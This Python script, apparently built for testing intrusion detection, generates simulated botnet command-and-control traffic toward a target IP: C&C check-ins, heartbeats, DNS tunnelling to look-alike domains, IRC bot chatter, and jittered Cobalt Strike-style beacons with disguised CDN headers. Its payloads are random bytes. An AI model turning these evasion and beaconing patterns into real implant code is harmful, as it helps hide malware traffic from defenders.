#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Bot 僵尸网络攻击脚本（5种攻击方式）
====================================

包含：C&C通信、心跳包、DNS隧道、IRC Bot、Beacon周期回连

用法：
  python bot_attack.py --target <IP> --attack <cnc|heartbeat|dns_tunnel|irc|beacon|all>

⚠️ 仅用于授权测试环境，禁止用于未授权目标！

御链天鉴开发团队
"""

import argparse
import random
import socket
import time
import threading
import base64
import json
import hashlib
import sys
from config import TARGET_IP, ATTACK_DURATION
from scapy.all import IP, TCP, UDP, DNS, DNSQR, DNSRR, Raw, send, sr1, RandShort, conf

conf.verb = 0


# ========== 1. C&C 通信模拟 ==========
def cnc_communication(target, port=8443, duration=60, interval=5):
    """
    C&C（Command & Control）通信：模拟受控主机与C2服务器交互
    特征：周期性TCP连接到非标准端口，JSON命令格式，加密通信模式
    """
    print(f"[C&C通信] 目标={target}:{port}, 持续={duration}s, 间隔={interval}s")
    end_time = time.time() + duration
    count = 0
    bot_id = hashlib.md5(str(random.randint(0, 999999)).encode()).hexdigest()[:12]

    commands = ["noop", "scan", "ddos", "spread", "update", "sleep",
                "exfil", "keylog", "screenshot", "persist"]

    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((target, port))

            # 注册/签到
            checkin = json.dumps({
                "type": "checkin",
                "bot_id": bot_id,
                "os": "Windows 10",
                "arch": "x64",
                "user": "admin",
                "ip": f"192.168.{random.randint(0,255)}.{random.randint(1,254)}",
                "timestamp": int(time.time()),
            })
            s.send(base64.b64encode(checkin.encode()) + b"\n")

            # 接收命令（模拟）
            time.sleep(0.5)
            cmd = random.choice(commands)
            task = json.dumps({
                "type": "task",
                "command": cmd,
                "args": {"target": "10.0.0.1", "duration": 60},
                "task_id": random.randint(1000, 9999),
            })
            s.send(base64.b64encode(task.encode()) + b"\n")

            # 回报结果
            time.sleep(0.3)
            result = json.dumps({
                "type": "result",
                "bot_id": bot_id,
                "task_id": random.randint(1000, 9999),
                "status": "success",
                "data": base64.b64encode(bytes(random.getrandbits(8) for _ in range(64))).decode(),
            })
            s.send(base64.b64encode(result.encode()) + b"\n")

            s.close()
            count += 1
        except Exception:
            pass
        time.sleep(interval + random.uniform(-1, 2))

    print(f"[C&C通信] 完成，共进行 {count} 次C2交互")


# ========== 2. 心跳包 ==========
def heartbeat(target, port=443, duration=60, interval=10):
    """
    心跳包模拟：Bot周期性向C2发送存活信号
    特征：精确周期性小数据包，固定大小，长时间持续
    """
    print(f"[心跳包] 目标={target}:{port}, 持续={duration}s, 间隔={interval}s")
    end_time = time.time() + duration
    count = 0
    bot_id = hashlib.md5(str(random.randint(0, 999999)).encode()).hexdigest()[:8]

    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((target, port))
            # 固定格式心跳包
            heartbeat_data = struct.pack("!4sIQ", bot_id[:4].encode(), count, int(time.time()))
            s.send(heartbeat_data)
            s.close()
            count += 1
        except Exception:
            pass

        # 精确间隔（带微小抖动）
        jitter = random.uniform(-0.5, 0.5)
        time.sleep(max(1, interval + jitter))

    print(f"[心跳包] 完成，共发送 {count} 个心跳包")


# ========== 3. DNS 隧道 ==========
def dns_tunneling(target, duration=60, interval=2):
    """
    DNS隧道攻击：通过DNS查询/响应传输数据，绕过防火墙
    特征：高频DNS查询，异常长域名，TXT记录查询，非标准子域名
    """
    print(f"[DNS隧道] 目标={target}, 持续={duration}s, 间隔={interval}s")
    end_time = time.time() + duration
    count = 0
    c2_domains = ["update.service-cdn.com", "api.cloud-sync.net",
                  "check.sys-monitor.org", "data.app-analytics.io"]

    while time.time() < end_time:
        # 生成数据并编码到DNS查询
        data = bytes(random.getrandbits(8) for _ in range(random.randint(16, 64)))
        encoded = base64.b32encode(data).decode().rstrip("=").lower()

        c2 = random.choice(c2_domains)
        # 分割编码数据作为子域名标签
        labels = [encoded[i:i+50] for i in range(0, len(encoded), 50)]
        query_name = ".".join(labels[:3]) + "." + c2  # 最多3级子域

        qtype = random.choice(["A", "TXT", "CNAME", "MX"])
        pkt = IP(dst=target) / UDP(sport=RandShort(), dport=53) / DNS(
            rd=1, qd=DNSQR(qname=query_name, qtype=qtype)
        )
        send(pkt)
        count += 1
        time.sleep(interval + random.uniform(-0.5, 0.5))

    print(f"[DNS隧道] 完成，共发送 {count} 个DNS隧道查询")


# ========== 4. IRC Bot 通信 ==========
def irc_bot(target, port=6667, duration=60, interval=5):
    """
    IRC Bot通信：模拟IRC协议的僵尸网络控制通道
    特征：IRC协议命令（NICK/JOIN/PRIVMSG），固定频道，周期性消息
    """
    print(f"[IRC Bot] 目标={target}:{port}, 持续={duration}s")
    end_time = time.time() + duration
    count = 0
    bot_nick = f"bot_{random.randint(1000,9999)}"
    channel = f"#botnet_{random.randint(100,999)}"

    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((target, port))

            # IRC注册
            s.send(f"NICK {bot_nick}\r\n".encode())
            s.send(f"USER {bot_nick} 0 * :Bot Client\r\n".encode())
            time.sleep(0.5)

            # 加入控制频道
            s.send(f"JOIN {channel}\r\n".encode())
            time.sleep(0.3)

            # 模拟Bot命令交互
            conn_end = min(time.time() + 20, end_time)
            while time.time() < conn_end:
                msg_type = random.choice(["status", "task", "result", "ping"])
                if msg_type == "status":
                    s.send(f"PRIVMSG {channel} :!status alive {bot_nick}\r\n".encode())
                elif msg_type == "task":
                    s.send(f"PRIVMSG {channel} :!scan 192.168.0.0/24\r\n".encode())
                elif msg_type == "result":
                    data = base64.b64encode(bytes(random.getrandbits(8) for _ in range(32))).decode()
                    s.send(f"PRIVMSG {channel} :!data {data}\r\n".encode())
                elif msg_type == "ping":
                    s.send(f"PING :keepalive_{int(time.time())}\r\n".encode())
                count += 1
                time.sleep(interval + random.uniform(-1, 2))

            s.send(f"QUIT :leaving\r\n".encode())
            s.close()
        except Exception:
            time.sleep(2)

    print(f"[IRC Bot] 完成，共发送 {count} 个IRC消息")


# ========== 5. Beacon 周期回连 ==========
def beacon(target, port=443, duration=120, interval=30):
    """
    Beacon回连：模拟CobaltStrike/Metasploit风格的Beacon
    特征：精确周期性HTTPS连接，固定URL模式，小数据交换
    """
    print(f"[Beacon] 目标={target}:{port}, 持续={duration}s, 间隔={interval}s")
    end_time = time.time() + duration
    count = 0
    session_id = hashlib.sha256(str(random.randint(0, 999999)).encode()).hexdigest()[:16]

    beacon_urls = ["/api/v1/check", "/updates/config.json", "/static/pixel.gif",
                   "/cdn/analytics.js", "/feed/rss.xml", "/status/health"]

    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((target, port))

            url = random.choice(beacon_urls)
            # 模拟HTTPS GET请求（Beacon签到）
            req = (
                f"GET {url}?sid={session_id}&t={int(time.time())} HTTP/1.1\r\n"
                f"Host: cdn-{random.randint(1,99)}.cloudfront.net\r\n"
                f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
                f"Cookie: __cfduid={session_id}; session={base64.b64encode(bytes(8)).decode()}\r\n"
                f"Accept: */*\r\n"
                f"Connection: close\r\n\r\n"
            )
            s.send(req.encode())

            # 模拟接收任务
            time.sleep(0.5)

            # 模拟回传结果
            result_data = base64.b64encode(bytes(random.getrandbits(8) for _ in range(random.randint(32, 256)))).decode()
            post_req = (
                f"POST /api/v1/result HTTP/1.1\r\n"
                f"Host: cdn-{random.randint(1,99)}.cloudfront.net\r\n"
                f"Content-Type: application/octet-stream\r\n"
                f"Content-Length: {len(result_data)}\r\n"
                f"X-Request-ID: {session_id}\r\n"
                f"Connection: close\r\n\r\n"
                f"{result_data}"
            )
            s.send(post_req.encode())
            s.close()
            count += 1
        except Exception:
            pass

        # Beacon精确间隔 + 10%抖动
        jitter = interval * 0.1 * random.uniform(-1, 1)
        time.sleep(max(5, interval + jitter))

    print(f"[Beacon] 完成，共进行 {count} 次Beacon回连")


# ========== 主入口 ==========
import struct

ATTACK_MAP = {
    "cnc": ("C&C通信攻击", cnc_communication),
    "heartbeat": ("心跳包攻击", heartbeat),
    "dns_tunnel": ("DNS隧道攻击", dns_tunneling),
    "irc": ("IRC Bot通信", irc_bot),
    "beacon": ("Beacon周期回连", beacon),
}

def main():
    parser = argparse.ArgumentParser(description="Bot僵尸网络攻击工具 - 御链天鉴")
    parser.add_argument("--target", "-t", default=TARGET_IP, help=f"目标IP地址 (默认: {TARGET_IP})")
    parser.add_argument("--attack", "-a", default="cnc",
                        choices=list(ATTACK_MAP.keys()) + ["all"], help="攻击类型")
    parser.add_argument("--port", "-p", type=int, default=8443, help="目标端口")
    parser.add_argument("--duration", "-d", type=int, default=60, help="持续时间(秒)")
    args = parser.parse_args()

    print(f"{'='*60}")
    print(f"Bot 僵尸网络攻击工具 - 御链天鉴")
    print(f"目标: {args.target}:{args.port}")
    print(f"持续: {args.duration}s")
    print(f"{'='*60}")

    if args.attack == "all":
        for key, (name, func) in ATTACK_MAP.items():
            print(f"\n--- {name} ---")
            if key == "dns_tunnel":
                func(args.target, duration=min(args.duration, 30))
            else:
                func(args.target, port=args.port, duration=min(args.duration, 30))
            time.sleep(2)
    else:
        name, func = ATTACK_MAP[args.attack]
        print(f"\n--- {name} ---")
        if args.attack == "dns_tunnel":
            func(args.target, duration=args.duration)
        else:
            func(args.target, port=args.port, duration=args.duration)

    print(f"\n{'='*60}")
    print("攻击完成")


if __name__ == "__main__":
    main()
